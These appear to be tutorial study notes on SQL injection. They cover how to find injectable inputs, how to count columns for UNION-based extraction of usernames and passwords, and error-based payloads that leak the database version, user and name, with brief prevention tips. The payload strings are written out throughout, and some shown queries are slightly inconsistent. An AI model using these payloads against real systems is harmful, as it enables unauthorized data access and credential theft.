## Basic SQL Injection

### 1. Identifying Injection Points

#### Common Injection Points
1. **User Input Fields**:
   - Login forms
   - Search fields
   - Registration forms
   - Contact forms

2. **URL Parameters**:
   - Query strings (e.g., `example.com/products?id=1`)

3. **Cookies**:
   - User information stored in cookies

4. **HTTP Headers**:
   - User-Agent, Referer, etc.

5. **API Endpoints**:
   - [[API#REST API|RESTful]] and [[API#SOAP API|SOAP API]] parameters

#### Techniques to Identify Injection Points

1. **Single Quote Test**:
- Enter a single quote (`'`) in input fields or URL parameters.
- If an error occurs (e.g., `SQL syntax error`), it indicates a potential injection point.
- Example:
```
Login Username: admin'
```
- SQL Query:
```sql
SELECT * FROM users WHERE username = 'admin'';
```

2. **Comment Injection Test**:
- Use SQL comments (`--`, `#`) to bypass parts of the query.
- Example:
```
Login Username: admin' -- 
```
- SQL Query:
```sql
SELECT * FROM users WHERE username = 'admin' -- ' AND password = 'password';
```

3. **Error-Based Testing**:
- Inject known bad inputs and look for database error messages.
- Example:
```
Product ID: 1'
```
- SQL Query:
```sql
SELECT * FROM products WHERE id = 1';
```
- Possible error message:
```
SQL syntax error near '1''
```

### 2. Basic UNION-Based SQL Injection

#### Understanding the UNION Operator
- The `UNION` operator is used in SQL to combine the results of two or more SELECT statements.
- Each SELECT statement within the UNION must have the same number of columns in the result sets with similar data types.

#### Determining the Number of Columns Required

1. **Injecting ORDER BY Clauses:**
- Use `ORDER BY` to determine the number of columns by incrementing the column index until an error occurs.
- Example:
```
Product ID: 1 ORDER BY 1 -- 
Product ID: 1 ORDER BY 2 -- 
Product ID: 1 ORDER BY 3 -- 
```
- Continue increasing the number until an error is returned. The last successful number indicates the number of columns.

2. **Using NULLs in UNION SELECT:**
- Inject a UNION SELECT statement with increasing numbers of NULL values to identify the number of columns.
- Example:
```
Product ID: 1 UNION SELECT NULL -- 
Product ID: 1 UNION SELECT NULL, NULL -- 
Product ID: 1 UNION SELECT NULL, NULL, NULL -- 
```
- Adjust the number of `NULL` values until no error is returned.

#### Steps to Perform UNION-Based SQL Injection

1. **Determine the Number of Columns:**
- Inject a UNION SELECT statement with NULL values to identify the number of columns.
- Example:
```
Product ID: 1 UNION SELECT NULL, NULL, NULL
```
- SQL Query:
```sql
SELECT column1, column2, column3 FROM products WHERE id = 1 UNION SELECT NULL, NULL, NULL;
```
- Adjust the number of `NULL` values until no error is returned.

2. **Find Data Types:**
- Replace NULL with values matching the data type of each column.
- Example:
```
Product ID: 1 UNION SELECT 1, 'string', NULL
```

3. **Extract Data:**
- Once the number of columns and their data types are known, extract data from another table.
- Example:
```
Product ID: 1 UNION SELECT username, password, NULL FROM users
```
- SQL Query:
```sql
SELECT column1, column2, column3 FROM products WHERE id = 1 UNION SELECT username, password, NULL FROM users;
```

#### Example Injection
Given a vulnerable query:
```sql
SELECT id, name, price FROM products WHERE id = '1';
```
Performing a UNION-based injection:
```
Input: 1 UNION SELECT username, password, '0' FROM users
```
Injected Query:
```sql
SELECT id, name, price FROM products WHERE id = '1' UNION SELECT username, password, '0' FROM users;
```

### Prevention Techniques
- **Parameterized Queries (Prepared Statements)**:
  - Ensures user inputs are treated as data, not executable code.
- **Stored Procedures**:
  - Encapsulate [[SQL]] code, reducing the risk of injection.
- **Input Validation**:
  - Validate and sanitize all user inputs.
- **Least Privilege**:
  - Limit database user privileges to reduce the impact of a successful injection.

## Error-Based SQL Injection

#### Leveraging Database Error Messages

**Overview:**
Error-based SQL injection exploits detailed database error messages to gather information about the database structure, such as table names, column names, and data types. When invalid queries are submitted, the resulting error messages can reveal clues about the database schema and help refine further injections.

**Common Techniques:**

1. **Basic Error-Based Injection:**
   - Injecting malformed SQL to cause errors and extract information from the error messages.
   - Example:
     ```
     Product ID: 1'
     ```
   - SQL Query:
     ```sql
     SELECT * FROM products WHERE id = '1';
     ```
   - Possible error message:
     ```
     SQL syntax error near '1''
     ```

2. **Using Functions to Extract Information:**
   - Injecting functions like `UNION SELECT` combined with known bad inputs can cause the database to output error messages with useful information.
   - Example:
     ```
     Product ID: 1 AND 1=CONVERT(int, (SELECT @@version))
     ```
   - SQL Query:
     ```sql
     SELECT * FROM products WHERE id = 1 AND 1=CONVERT(int, (SELECT @@version));
     ```
   - Possible error message:
     ```
     Conversion failed when converting the nvarchar value 'Microsoft SQL Server 2017' to data type int.
     ```

**Steps to Perform Error-Based SQL Injection:**

1. **Identify an Injection Point:**
   - Use single quotes, comments, or other basic tests to find an injection point.
   - Example:
     ```
     Product ID: 1'
     ```

2. **Trigger a SQL Error:**
   - Inject invalid SQL syntax to trigger an error message.
   - Example:
     ```
     Product ID: 1'
     ```
   - SQL Query:
     ```sql
     SELECT * FROM products WHERE id = '1';
     ```
   - Possible error message:
     ```
     SQL syntax error near '1''
     ```

3. **Extract Database Information:**
   - Use specific SQL payloads to extract information from error messages.
   - Example:
     ```
     Product ID: 1 AND 1=CONVERT(int, (SELECT @@version))
     ```
   - SQL Query:
     ```sql
     SELECT * FROM products WHERE id = 1 AND 1=CONVERT(int, (SELECT @@version));
     ```
   - Possible error message:
     ```
     Conversion failed when converting the nvarchar value 'Microsoft SQL Server 2017' to data type int.
     ```

**Examples of Information Extraction:**

1. **Database Version:**
   - Payload:
     ```
     Product ID: 1 AND 1=CONVERT(int, (SELECT @@version))
     ```
   - Possible error message:
     ```
     Conversion failed when converting the nvarchar value 'Microsoft SQL Server 2017' to data type int.
     ```

2. **Current Database User:**
   - Payload:
     ```
     Product ID: 1 AND 1=CONVERT(int, (SELECT user))
     ```
   - Possible error message:
     ```
     Conversion failed when converting the nvarchar value 'dbuser' to data type int.
     ```

3. **Database Name:**
   - Payload:
     ```
     Product ID: 1 AND 1=CONVERT(int, (SELECT db_name()))
     ```
   - Possible error message:
     ```
     Conversion failed when converting the nvarchar value 'dbname' to data type int.
     ```

- **Stored Procedures:**
  - Encapsulate SQL code, reducing the risk of injection.
- **Input Validation:**
  - Validate and sanitize all user inputs.

By leveraging detailed database error messages, attackers can gain significant insights into the database structure and refine their attacks accordingly. Proper defensive measures, such as input validation and error handling, are essential to mitigate the risks associated with error-based SQL injection.
